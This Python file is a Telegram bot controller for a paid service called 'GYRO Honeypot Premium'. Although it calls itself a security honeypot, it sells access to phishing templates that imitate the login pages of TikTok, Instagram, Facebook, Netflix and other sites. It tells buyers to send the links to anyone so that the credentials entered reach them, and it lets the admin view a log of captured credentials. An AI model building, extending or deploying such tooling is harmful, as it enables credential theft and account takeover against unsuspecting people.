#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
GYRO Honeypot Premium - Advanced Telegram Bot Controller
"""

import json
import logging
import subprocess
from datetime import datetime
import asyncio

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.request import HTTPXRequest

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Load configs
with open('config.json', 'r') as f:
    CONFIG = json.load(f)

with open('premium_config.json', 'r') as f:
    PREMIUM_CONFIG = json.load(f)

# Constants
ADMIN_CHAT_ID = CONFIG['telegram']['admin_chat_id']
BOT_TOKEN = CONFIG['telegram']['bot_token']
PREMIUM_PASSWORD = CONFIG['premium']['password']
BASE_URL = "https://your-domain.com"  # CHANGE THIS TO YOUR DOMAIN

class PremiumHoneypotBot:
    def __init__(self):
        self.premium_users = PREMIUM_CONFIG.get('premium_users', {})
        self.pending_users = PREMIUM_CONFIG.get('pending_users', {})
        self.used_passwords = PREMIUM_CONFIG.get('used_passwords', [])
        self.honeypot_process = None
        self.is_running = False
        
    def save_premium_config(self):
        """Save premium config to file."""
        with open('premium_config.json', 'w') as f:
            json.dump({
                'premium_users': self.premium_users,
                'pending_users': self.pending_users,
                'used_passwords': self.used_passwords
            }, f, indent=2)
    
    def is_premium_user(self, chat_id: str) -> bool:
        """Check if user is premium."""
        return chat_id in self.premium_users and self.premium_users[chat_id].get('activated', False)
    
    def is_admin(self, chat_id: str) -> bool:
        """Check if user is admin."""
        return chat_id == ADMIN_CHAT_ID
    
    def get_user_templates(self, chat_id: str) -> list:
        """Get templates available for user."""
        if chat_id in self.premium_users:
            return self.premium_users[chat_id].get('templates', [])
        return []
    
    async def activate_user(self, chat_id: str, username: str, password: str) -> bool:
        """Activate premium user."""
        if password not in self.used_passwords and password == PREMIUM_PASSWORD:
            self.premium_users[chat_id] = {
                'chat_id': chat_id,
                'username': username,
                'activated': True,
                'activated_at': datetime.now().isoformat(),
                'is_admin': chat_id == ADMIN_CHAT_ID,
                'templates': ['tiktok', 'instagram', 'facebook', 'snapchat', 'twitter', 'linkedin', 
                             'github', 'spotify', 'netflix', 'reddit'],
                'custom_links': {}
            }
            self.used_passwords.append(password)
            self.save_premium_config()
            return True
        return False

# Initialize bot
bot = PremiumHoneypotBot()

# ============ BOT COMMAND HANDLERS ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command."""
    user = update.effective_user
    chat_id = str(update.effective_chat.id)
    
    if bot.is_premium_user(chat_id):
        # Premium user menu
        keyboard = [
            [InlineKeyboardButton("📋 Get Templates", callback_data="get_templates")],
            [InlineKeyboardButton("🔗 Generate Custom Link", callback_data="custom_link")],
            [InlineKeyboardButton("📊 View Stats", callback_data="view_stats")],
            [InlineKeyboardButton("🔄 Restart Honeypot", callback_data="restart_honeypot")],
            [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
        ]
        if bot.is_admin(chat_id):
            keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"✅ Welcome back, {user.first_name}!\n\n"
            f"You have premium access to all templates.\n"
            f"Use the buttons below to get started.",
            reply_markup=reply_markup
        )
    else:
        # Not premium - show activation
        keyboard = [
            [InlineKeyboardButton("🔑 Activate Premium", callback_data="activate_premium")],
            [InlineKeyboardButton("💳 Buy Premium", callback_data="buy_premium")],
            [InlineKeyboardButton("ℹ️ About", callback_data="about")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"🔐 Welcome to GYRO Honeypot Premium!\n\n"
            f"To access all features, you need to activate your premium account.\n\n"
            f"💰 Price: {CONFIG['premium']['price']}\n"
            f"📱 Contact: {CONFIG['premium']['payment_info']}",
            reply_markup=reply_markup
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks."""
    query = update.callback_query
    await query.answer()
    chat_id = str(update.effective_chat.id)
    data = query.data
    
    if data == "activate_premium":
        await query.edit_message_text(
            "🔑 **Enter Your Premium Password**\n\n"
            "Please send the password you received after purchase.\n\n"
            "Format: Send the password as a message.\n\n"
            "💡 If you don't have a password, click 'Buy Premium' below.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 Buy Premium", callback_data="buy_premium")],
                [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
            ]),
            parse_mode='Markdown'
        )
        context.user_data['state'] = 'awaiting_password'
    
    elif data == "buy_premium":
        await query.edit_message_text(
            f"💳 **How to Buy Premium**\n\n"
            f"💰 Price: {CONFIG['premium']['price']}\n\n"
            f"Contact the following to purchase:\n"
            f"📱 Telegram: @mrgyroxd\n"
            f"💬 WhatsApp: https://wa.me/2348164404128\n\n"
            f"After payment, you will receive your premium password.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
            ]),
            parse_mode='Markdown'
        )
    
    elif data == "get_templates":
        if not bot.is_premium_user(chat_id):
            await query.edit_message_text(
                "❌ You need premium access to get templates.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔑 Activate Premium", callback_data="activate_premium")]
                ])
            )
            return
        
        templates = bot.get_user_templates(chat_id)
        if not templates:
            await query.edit_message_text("No templates available.")
            return
        
        # Build template list with icons
        template_icons = {
            'tiktok': '🎵', 'instagram': '📸', 'facebook': '👤', 'snapchat': '👻',
            'twitter': '🐦', 'linkedin': '💼', 'github': '🐙', 'spotify': '🎧',
            'netflix': '🎬', 'reddit': '🤖'
        }
        
        keyboard = []
        for template in templates:
            icon = template_icons.get(template, '📄')
            keyboard.append([InlineKeyboardButton(
                f"{icon} {template.title()}", 
                callback_data=f"get_template_{template}"
            )])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")])
        
        await query.edit_message_text(
            f"📋 **Available Templates**\n\n"
            f"Select a template to get its link:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    elif data.startswith("get_template_"):
        template_name = data.replace("get_template_", "")
        if not bot.is_premium_user(chat_id):
            await query.edit_message_text("❌ Premium required.")
            return
        
        # Get the template URL
        template_url = f"{BASE_URL}/templates/{template_name}.html"
        
        keyboard = [
            [InlineKeyboardButton("📤 Share Link", callback_data=f"share_{template_name}")],
            [InlineKeyboardButton("🔙 Back to Templates", callback_data="get_templates")]
        ]
        
        await query.edit_message_text(
            f"✅ **{template_name.title()} Template**\n\n"
            f"🔗 **Link:**\n`{template_url}`\n\n"
            f"📝 **Instructions:**\n"
            f"1. Share this link with anyone\n"
            f"2. They will see a login page\n"
            f"3. Any credentials entered will be sent to you\n\n"
            f"⚡ Works on all devices!",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    elif data.startswith("share_"):
        template_name = data.replace("share_", "")
        template_url = f"{BASE_URL}/templates/{template_name}.html"
        
        await query.edit_message_text(
            f"📤 **Share this link:**\n\n"
            f"`{template_url}`\n\n"
            f"Copy and send to anyone!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back", callback_data=f"get_template_{template_name}")]
            ])
        )
    
    elif data == "custom_link":
        if not bot.is_premium_user(chat_id):
            await query.edit_message_text("❌ Premium required.")
            return
        
        context.user_data['state'] = 'awaiting_custom_link'
        await query.edit_message_text(
            "🔗 **Custom Link Generator**\n\n"
            "Send me the custom path you want.\n\n"
            "Example: `myloginpage`\n"
            f"This will create: `{BASE_URL}/myloginpage`\n\n"
            "Send the path as a message.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Cancel", callback_data="back_to_menu")]
            ]),
            parse_mode='Markdown'
        )
    
    elif data == "view_stats":
        if not bot.is_premium_user(chat_id):
            await query.edit_message_text("❌ Premium required.")
            return
        
        # Count attacks
        try:
            with open('logs/events.jsonl', 'r') as f:
                lines = f.readlines()
                total_attacks = len(lines)
                cred_captures = sum(1 for line in lines if 'Credentials captured' in line)
        except:
            total_attacks = 0
            cred_captures = 0
        
        await query.edit_message_text(
            f"📊 **Your Statistics**\n\n"
            f"🔹 Total Attacks: {total_attacks}\n"
            f"🔹 Credentials Captured: {cred_captures}\n"
            f"🔹 Active Premium Users: {len(bot.premium_users)}\n"
            f"🔹 Templates Available: {len(bot.get_user_templates(chat_id))}\n\n"
            f"📅 Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
            ]),
            parse_mode='Markdown'
        )
    
    elif data == "restart_honeypot":
        if not bot.is_premium_user(chat_id):
            await query.edit_message_text("❌ Premium required.")
            return
        
        await query.edit_message_text(
            "🔄 Restarting honeypot...\n"
            "This may take a few seconds.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
            ])
        )
        
        # Restart honeypot
        try:
            if bot.honeypot_process:
                bot.honeypot_process.terminate()
            bot.honeypot_process = subprocess.Popen(["python", "honeypot.py"])
            await query.edit_message_text(
                "✅ Honeypot restarted successfully!",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
                ])
            )
        except Exception as e:
            await query.edit_message_text(f"❌ Error restarting: {e}")
    
    elif data == "admin_panel":
        if not bot.is_admin(chat_id):
            await query.edit_message_text("❌ Admin only.")
            return
        
        keyboard = [
            [InlineKeyboardButton("👥 List Users", callback_data="list_users")],
            [InlineKeyboardButton("📊 Full Stats", callback_data="full_stats")],
            [InlineKeyboardButton("🔑 Change Password", callback_data="change_password")],
            [InlineKeyboardButton("📝 View Logs", callback_data="view_logs")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
        ]
        await query.edit_message_text(
            "⚙️ **Admin Panel**\n\n"
            "Select an option:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    elif data == "list_users":
        if not bot.is_admin(chat_id):
            await query.edit_message_text("❌ Admin only.")
            return
        
        if not bot.premium_users:
            await query.edit_message_text("No premium users yet.")
            return
        
        user_list = "👥 **Premium Users**\n\n"
        for uid, info in bot.premium_users.items():
            user_list += f"• ID: `{uid}`\n"
            user_list += f"  Username: {info.get('username', 'Unknown')}\n"
            user_list += f"  Activated: {info.get('activated_at', 'Unknown')}\n\n"
        
        await query.edit_message_text(
            user_list[:4000],
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]
            ])
        )
    
    elif data == "full_stats":
        if not bot.is_admin(chat_id):
            await query.edit_message_text("❌ Admin only.")
            return
        
        try:
            with open('logs/events.jsonl', 'r') as f:
                lines = f.readlines()
                total = len(lines)
                creds = sum(1 for line in lines if 'Credentials captured' in line)
        except:
            total = creds = 0
        
        await query.edit_message_text(
            f"📊 **Full Statistics**\n\n"
            f"🔹 Total Attacks: {total}\n"
            f"🔹 Credentials Captured: {creds}\n"
            f"🔹 Premium Users: {len(bot.premium_users)}\n"
            f"🔹 Templates: 10\n"
            f"🔹 Services Running: 3 (SSH, Telnet, FTP)\n\n"
            f"📅 Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]
            ]),
            parse_mode='Markdown'
        )
    
    elif data == "change_password":
        if not bot.is_admin(chat_id):
            await query.edit_message_text("❌ Admin only.")
            return
        
        context.user_data['state'] = 'awaiting_new_password'
        await query.edit_message_text(
            "🔑 **Change Premium Password**\n\n"
            "Send the new premium password as a message.\n\n"
            "⚠️ This will affect all new users!",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]
            ]),
            parse_mode='Markdown'
        )
    
    elif data == "view_logs":
        if not bot.is_admin(chat_id):
            await query.edit_message_text("❌ Admin only.")
            return
        
        try:
            with open('logs/credentials/captured_credentials.log', 'r') as f:
                logs = f.read().split('\n')[-50:]  # Last 50 lines
                log_text = '\n'.join(logs)
                if len(log_text) > 4000:
                    log_text = log_text[-4000:]
        except:
            log_text = "No logs available."
        
        await query.edit_message_text(
            f"📝 **Recent Credentials**\n\n"
            f"```\n{log_text}\n```",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]
            ])
        )
    
    elif data == "about":
        await query.edit_message_text(
            "ℹ️ **About GYRO Honeypot**\n\n"
            "🔐 Premium honeypot system for security monitoring.\n\n"
            "**Features:**\n"
            "• 10 realistic login templates\n"
            "• Custom link generation\n"
            "• IP & location tracking\n"
            "• Telegram notifications\n"
            "• Live dashboard\n\n"
            "**Support:**\n"
            "📱 @mrgyroxd\n"
            "💬 WhatsApp: https://wa.me/2348164404128",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
            ]),
            parse_mode='Markdown'
        )
    
    elif data == "back_to_menu":
        # Clear state
        context.user_data['state'] = None
        await start(update, context)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle user messages."""
    chat_id = str(update.effective_chat.id)
    message = update.message.text
    
    state = context.user_data.get('state')
    
    if state == 'awaiting_password':
        # Check premium password
        if await bot.activate_user(chat_id, update.effective_user.username or "User", message):
            context.user_data['state'] = None
            await update.message.reply_text(
                "✅ **Premium Activated!** 🎉\n\n"
                "You now have access to all templates and features.\n"
                "Use /start to see the main menu.",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                "❌ **Invalid Password!**\n\n"
                "The password you entered is not valid.\n"
                "Please check and try again.\n\n"
                "💳 Contact @mrgyroxd if you need help.",
                parse_mode='Markdown'
            )
    
    elif state == 'awaiting_custom_link':
        # Generate custom link
        context.user_data['state'] = None
        template_name = message.lower().replace(' ', '_')
        
        # Create custom template
        custom_url = f"{BASE_URL}/{template_name}"
        
        # Save custom link
        if chat_id not in bot.premium_users:
            bot.premium_users[chat_id] = {}
        if 'custom_links' not in bot.premium_users[chat_id]:
            bot.premium_users[chat_id]['custom_links'] = {}
        
        bot.premium_users[chat_id]['custom_links'][template_name] = {
            'url': custom_url,
            'created_at': datetime.now().isoformat()
        }
        bot.save_premium_config()
        
        await update.message.reply_text(
            f"✅ **Custom Link Created!**\n\n"
            f"🔗 **Your Custom Link:**\n`{custom_url}`\n\n"
            f"📝 **Share this link with anyone!**\n"
            f"Anyone who visits will see the login page.\n\n"
            f"To create more, use /start and select 'Generate Custom Link'.",
            parse_mode='Markdown'
        )
    
    elif state == 'awaiting_new_password':
        if not bot.is_admin(chat_id):
            await update.message.reply_text("❌ Admin only.")
            return
        
        # Update premium password
        global PREMIUM_PASSWORD
        PREMIUM_PASSWORD = message
        CONFIG['premium']['password'] = message
        
        with open('config.json', 'w') as f:
            json.dump(CONFIG, f, indent=2)
        
        context.user_data['state'] = None
        await update.message.reply_text(
            f"✅ **Premium Password Changed!**\n\n"
            f"New password: `{message}`\n\n"
            f"This password will now be used for all new users.",
            parse_mode='Markdown'
        )

def main():
    """Main entry point."""
    try:
        # Create custom request with longer timeouts
        request = HTTPXRequest(
            connect_timeout=30.0,
            read_timeout=30.0,
            write_timeout=30.0,
            pool_timeout=30.0,
        )
        
        # Create application with custom request
        application = Application.builder().token(BOT_TOKEN).request(request).build()
        
        # Add handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", start))
        application.add_handler(CallbackQueryHandler(button_callback))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        print(f"🤖 GYRO Honeypot Premium Bot Started!")
        print(f"👑 Admin: {ADMIN_CHAT_ID}")
        print(f"🔐 Premium Password: {PREMIUM_PASSWORD}")
        print(f"💳 Price: {CONFIG['premium']['price']}")
        print("\nPress Ctrl+C to stop...")
        
        # Start bot with longer timeout
        application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            timeout=30,
            read_timeout=30,
            write_timeout=30,
            pool_timeout=30,
            drop_pending_updates=True
        )
        
    except Exception as e:
        print(f"❌ Error starting bot: {e}")
        print("\nCheck your config.json and make sure:")
        print("1. Bot token is correct")
        print("2. Chat ID is correct")
        print("3. Internet connection is working")
        print("\nIf you're on mobile data, try switching to WiFi.")
        print("If you're using VPN, try disabling it.")

if __name__ == "__main__":
    main()
